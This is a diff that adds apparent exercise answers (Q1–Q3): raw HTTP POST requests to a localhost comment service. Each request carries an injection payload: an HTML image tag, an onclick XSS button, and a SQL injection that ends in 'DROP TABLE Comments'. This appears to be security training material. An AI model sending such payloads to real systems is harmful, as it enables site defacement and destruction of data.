@@ -1,0 +1,27 @@
+# Q1
+
+POST http://localhost:8188/UniProxService.svc/comment?name=Nixon HTTP/1.1
+Host: localhost
+Content-Type: application/json
+Content-Length: 113
+
+"<img src=https://67.media.tumblr.com/e90e7b50a508dfb2f36fbf7c981ae141/tumblr_o1ktxwg3pV1v5musvo1_500.gif></img>"
+
+
+# Q2
+
+POST http://localhost:8188/UniProxService.svc/comment?name=Nixon HTTP/1.1
+Host: localhost
+Content-Type: application/json
+Content-Length: 129
+
+"<button onclick=document.removeChild(document.body.style.transform=\"rotate(180deg)\") >Totally safe button! CLICK ME!</button>"
+
+# Q3
+
+POST http://localhost:8188/UniProxService.svc/comment?name=Nixon HTTP/1.1
+Host: localhost
+Content-Type: application/json
+Content-Length: 50
+
+"Legitimate comment...'); DROP TABLE Comments;--"
